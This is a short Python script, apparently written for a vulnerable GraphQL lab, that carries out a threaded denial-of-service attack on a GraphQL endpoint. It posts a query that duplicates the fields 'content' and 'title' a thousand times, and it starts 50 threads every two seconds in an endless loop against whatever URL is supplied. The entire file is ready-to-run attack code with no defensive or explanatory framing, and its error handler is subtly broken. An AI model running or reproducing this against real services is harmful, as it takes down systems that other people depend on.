import sys
import requests
import threading
import time

THREADS = 50

def usage():
  print('Usage: python3 exploit_threaded_field_dup.py <target_url>')  
  print('Example: python3 exploit_threaded_field_dup.py http://localhost:5013/graphql')  
  sys.exit(1)

if len(sys.argv) < 2:
  print('Missing URL')
  usage()

GRAPHQL_URL = sys.argv[1]

payload = 'content \n title \n' * 1000
query = {'query':'query { \n ' + payload + '}'}

def DoS():  
  try:
    r = requests.post(GRAPHQL_URL, json=query)
    print('Time took: {} seconds '.format(r.elapsed.total_seconds()))
    print('Response:', r.json())
  except Exception as e:
    print('Error', e.message)
          
while True:
  print('Running...')
  time.sleep(2)
  for _ in range(THREADS):
    t = threading.Thread(target=DoS, args=())
    t.start()
